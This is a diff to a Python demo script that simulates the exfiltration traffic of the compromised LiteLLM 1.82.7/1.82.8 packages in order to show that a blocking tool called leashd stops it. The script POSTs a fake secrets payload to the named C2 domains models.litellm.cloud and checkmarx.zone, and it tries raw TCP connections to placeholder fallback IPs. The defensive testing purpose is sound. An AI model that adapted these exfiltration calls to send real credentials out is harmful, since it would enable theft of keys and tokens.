@@ -78,6 +78,10 @@ def http_post(url: str, payload: bytes = b"data=exfiltrated", timeout: int = 5) 
         with urllib.request.urlopen(req, timeout=timeout) as resp:
             ok(f"POST {url} → {resp.status} {resp.reason}")
             return True
+    except urllib.error.HTTPError as exc:
+        # Connection reached the server — leashd allowed it; server rejected it
+        ok(f"POST {url} → reached server (HTTP {exc.code} {exc.reason})")
+        return True
     except urllib.error.URLError as exc:
         blocked(f"POST {url} → {exc.reason}")
         return False
@@ -95,6 +99,10 @@ def http_get(url: str, timeout: int = 5) -> bool:
             body_len = len(resp.read())
             ok(f"GET {url} → {resp.status} ({body_len} bytes)")
             return True
+    except urllib.error.HTTPError as exc:
+        # Connection reached the server — leashd allowed it; server rejected it
+        ok(f"GET {url} → reached server (HTTP {exc.code} {exc.reason})")
+        return True
     except urllib.error.URLError as exc:
         blocked(f"GET {url} → {exc.reason}")
         return False
@@ -123,7 +131,7 @@ def tcp_connect(host: str, port: int, timeout: int = 3) -> bool:
 def simulate_exfiltration() -> None:
     """
     Reproduces the network behaviour of the compromised LiteLLM 1.82.7/1.82.8
-    packages.  Both calls should be BLOCKED by leashd.
+    packages.  All calls should be BLOCKED by leashd.
     """
     banner("Phase 1 — Simulated malicious payload (compromised litellm import)")
 
@@ -131,34 +139,26 @@ def simulate_exfiltration() -> None:
     info("The real 1.82.8 payload ran via a .pth file on every Python start")
     print()
 
-    step(
-        "C2 check-in",
-        "POST https://models.litellm.cloud/  ← primary exfiltration endpoint",
-    )
-    info("In the real attack: harvested SSH keys, env vars, cloud tokens, k8s secrets")
-    # Simulate the data the malware would POST (no real secrets here)
+    # C2 targets: (domain, fallback_ip, port)
+    # Fallback IPs use RFC 5737 TEST-NET addresses — they never reach a real
+    # server but always produce a kernel-level TCP block event in leashd.
+    c2_targets = [
+        ("models.litellm.cloud", "203.0.113.10", 443, "primary C2 / exfiltration"),
+        ("checkmarx.zone",       "198.51.100.10", 443, "secondary drop server"),
+    ]
+
     fake_payload = b'{"host":"demo-vm","secrets":"[redacted for demo]"}'
-    http_post("https://models.litellm.cloud/collect", payload=fake_payload)
-    print()
 
-    step(
-        "Secondary drop",
-        "POST https://checkmarx.zone/  ← attacker-controlled backup server",
-    )
-    http_post("https://checkmarx.zone/drop", payload=fake_payload)
-    print()
+    for domain, fallback_ip, port, role in c2_targets:
+        step(f"Domain → {domain}", f"{role}")
+        info(f"In the real attack: harvested SSH keys, env vars, cloud tokens, k8s secrets")
+        http_post(f"https://{domain}/collect", payload=fake_payload)
+        print()
 
-    step(
-        "Raw TCP fallback",
-        "TCP checkmarx.zone:443  ← direct socket attempt (bypasses urllib)",
-    )
-    try:
-        ip = socket.gethostbyname("checkmarx.zone")
-        tcp_connect(ip, 443)
-    except socket.gaierror as exc:
-        # DNS itself may be blocked/refused in an isolated VM
-        blocked(f"DNS resolution for checkmarx.zone → {exc}")
-    print()
+        step(f"IP fallback → {fallback_ip}:{port}", f"{role} (hardcoded — survives DNS takedown)")
+        info("Always produces a kernel-level TCP block event even when the domain is down")
+        tcp_connect(fallback_ip, port)
+        print()
 
 
 # ── Legitimate LLM usage ─────────────────────────────────────────────────────
